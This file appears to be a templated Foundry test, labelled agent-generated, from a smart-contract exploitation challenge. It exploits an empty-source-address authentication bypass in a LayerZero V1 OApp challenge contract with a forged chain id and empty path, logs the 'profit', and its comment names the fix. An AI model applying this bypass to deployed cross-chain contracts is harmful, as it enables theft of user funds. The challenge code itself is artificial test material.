// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
// Technique: V1 empty-path bypass — the trusted-remote comparison casts
// bytes32(0)→address(0), so an EMPTY srcAddress authenticates against any
// unconfigured source chain. Bind the remote path exactly (bytes equality on
// the full 32-byte value, rejecting zero) to defeat it.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroOAppV1} from "../../src/challenges/LayerZeroOAppV1.sol";
import {ERC20Mintable} from "../../src/tokens/ERC20Mintable.sol";

contract {{TEST_CONTRACT}} is Test {
    function test_agentSolve() public {
        vm.startPrank(makeAddr("deployer"));
        ERC20Mintable token = new ERC20Mintable("Cross Token", "XTK");
        LayerZeroOAppV1 oapp = new LayerZeroOAppV1(address(token));
        vm.stopPrank();

        vm.prank(makeAddr("deployer")); // deployer is the minter
        token.mint(address(this), 1_000_000 ether);
        token.transfer(address(oapp), 500_000 ether);

        // Empty srcAddress + forged chain id: bytes32(0) cast "matches" the
        // stored empty path after the << 96 normalization.
        bytes memory payload = abi.encode(address(this), 10_000 ether);
        oapp.lzReceive(9999, "", 1, payload);

        assertGt(token.balanceOf(address(this)), 500_000 ether, "empty path did not authenticate");
        console2.log("[PROFIT_WEI]", token.balanceOf(address(this)) - 500_000 ether);
    }
}
